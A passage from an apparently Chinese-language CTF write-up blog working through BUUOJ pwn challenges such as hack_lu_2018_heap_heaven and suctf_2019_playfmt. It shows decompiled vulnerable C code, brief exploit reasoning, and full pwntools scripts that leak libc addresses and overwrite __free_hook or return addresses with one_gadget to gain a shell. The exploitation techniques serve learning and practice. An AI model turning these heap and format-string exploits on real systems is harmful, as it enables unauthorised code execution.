class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'b'</span>)  <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'b'</span>)  <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(7)</span></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'d'</span>)  <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="hack-lu-2018-heap-heaven"><a href="#hack-lu-2018-heap-heaven" class="headerlink" title="hack_lu_2018_heap_heaven"></a>hack_lu_2018_heap_heaven</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">free_wrapper</span><span class="params">(__int64 offset)</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">free</span>(&amp;mmapped[offset]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个题还是挺有意思的，任意地址free</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">leak_wrapper</span><span class="params">(__int64 offset)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">const</span> <span class="type">char</span> **)&amp;mmapped[offset];</span><br><span class="line">  <span class="keyword">if</span> ( &amp;mmapped[offset] &gt; &amp;mmapped[MMAP_SIZE - <span class="number">8</span>] || v2 &lt; (<span class="type">const</span> <span class="type">char</span> **)mmapped )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(*v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在mmap区域后可以任意写</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  Data *v3; <span class="comment">// rbx</span></span><br><span class="line">  Data *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 buf; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 num; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  state = (Data *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  v3 = state;</span><br><span class="line">  v3-&gt;func = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *(_QWORD *)state-&gt;func = bye;</span><br><span class="line">  *((_QWORD *)state-&gt;func + <span class="number">1</span>) = menu;</span><br><span class="line">  v4 = state;</span><br></pre></td></tr></tbody></table></figure>

<p>还有个关键的是<code>state-&gt;func + 1 = menu;</code>，漏洞利用思路看了ha1vk师傅的，因为可以任意地址free，所以先弄出unsortedbin，这样子就可以泄露出top_chunk，从而再利用leak功能leak出libc，elf_base，这些基址，最后可以得到state的地址，在mmap那里构造一个fake_chunk，使得释放后+state-&gt;func那里的state-&gt;func + 1落在ogg上即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./hack_lu_2018_heap_heaven'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26473</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'[5] : exit\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">size, offset, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much do you want to write?\n'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'At which offset?\n'</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">offset</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'At which offset do you want to free?\n'</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">offset</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'At which offset do you want to leak?\n'</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"><span class="comment">#dbgg()</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">p1 += <span class="string">b'a'</span> * <span class="number">0x80</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">p1 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">p1 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">p1 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">write(<span class="built_in">len</span>(p1), <span class="number">0</span>, p1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">top_chunk_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'top_chunk_addr = '</span> + <span class="built_in">hex</span>(top_chunk_addr))</span><br><span class="line"></span><br><span class="line">p2 = p64(top_chunk_addr - <span class="number">0x10</span>)</span><br><span class="line">write(<span class="built_in">len</span>(p2), <span class="number">0</span>, p2)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">elf_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0x1670</span></span><br><span class="line">li(<span class="string">'elf_base = '</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">state_addr = <span class="number">0x4040</span> + elf_base</span><br><span class="line">li(<span class="string">'state_addr = '</span> + <span class="built_in">hex</span>(state_addr))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>] + elf_base</span><br><span class="line">li(<span class="string">'puts_got = '</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">p3 = p64(puts_got)</span><br><span class="line">write(<span class="built_in">len</span>(p3), <span class="number">0</span>, p3)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('./2.23/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span></span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = one[<span class="number">2</span>] + libc_base</span><br><span class="line"></span><br><span class="line">mmapd_addr = <span class="number">0x4048</span> + elf_base + <span class="number">1</span></span><br><span class="line">p4 = p64(mmapd_addr)</span><br><span class="line">write(<span class="built_in">len</span>(p4), <span class="number">0</span>, p4)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">mmap_addr = u64(r.recv(<span class="number">4</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">li(<span class="string">'mmap_addr = '</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"></span><br><span class="line">p5 = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">p5 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p5 += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">p5 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">write(<span class="built_in">len</span>(p5), <span class="number">0</span>, p5)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p6 = p64(one_gadget)</span><br><span class="line">write(<span class="built_in">len</span>(p6), <span class="number">8</span>, p6)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbgg()</span></span><br><span class="line">delete(top_chunk_addr - <span class="number">0x30</span> - mmap_addr)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf_2019_playfmt"></a>suctf_2019_playfmt</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_fmt</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>非栈上的格式化漏洞，正常泄露，任意写的话要借助链子，直接套了一个板子，libc明明一样，结果ogg出来不一样</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./suctf_2019_playfmt'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28361</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">'%6$p.%23$p'</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(r.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'stack_addr = '</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(r.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'__libc_start_main = '</span> + <span class="built_in">hex</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'libc-2.27.so'</span>)</span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">241</span></span><br><span class="line"><span class="comment">#one = [0xc9bbb, 0x14482b, 0x14482c]</span></span><br><span class="line">one = [<span class="number">0x3cbea</span>, <span class="number">0x3cbec</span>, <span class="number">0x3cbf0</span>, <span class="number">0x3cbf7</span>, <span class="number">0x6729f</span>, <span class="number">0x672a0</span>, <span class="number">0x13573e</span>, <span class="number">0x13573f</span>]</span><br><span class="line"><span class="comment">#one = [0x3d0d3, 0x3d0d5, 0x3d0d9, 0x3d0e0, 0x67a7f, 0x67a80, 0x137e5e, 0x137e5f]</span></span><br><span class="line">one_gadget = one[<span class="number">3</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_address</span>(<span class="params">off0,off1,target_addr</span>):</span><br><span class="line">    r.sendline(<span class="string">"%{}$p"</span>.<span class="built_in">format</span>(off1))</span><br><span class="line">    r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    addr1 = <span class="built_in">int</span>(r.recv(<span class="number">8</span>),<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    r.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        r.sendline(<span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>(addr1+i,off0))</span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>(target_addr&amp;<span class="number">0xff</span>,off1))</span><br><span class="line">        r.recv()</span><br><span class="line">        target_addr=target_addr&gt;&gt;<span class="number">8</span></span><br><span class="line">    r.sendline(<span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>(addr1,off0))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">write_address(<span class="number">6</span>, <span class="number">14</span>, stack_addr - <span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line">write_address(<span class="number">14</span>, <span class="number">26</span>, one_gadget)</span><br><span class="line">r.sendline(<span class="string">'quit'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-dubblesort"><a href="#pwnable-dubblesort" class="headerlink" title="pwnable_dubblesort"></a>pwnable_dubblesort</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *ptr; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+18h] [ebp-74h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9[<span class="number">8</span>]; <span class="comment">// [esp+1Ch] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [esp+3Ch] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"What your name :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;v8);</span><br><span class="line">  v3 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  {</span><br><span class="line">    ptr = v9;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">    {</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">"Enter the %d number : "</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%u"</span>, ptr);</span><br><span class="line">      v3 = v8;</span><br><span class="line">      ++ptr;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  sub_931(v9, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Result :"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">"%u "</span>);</span><br><span class="line">  }</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  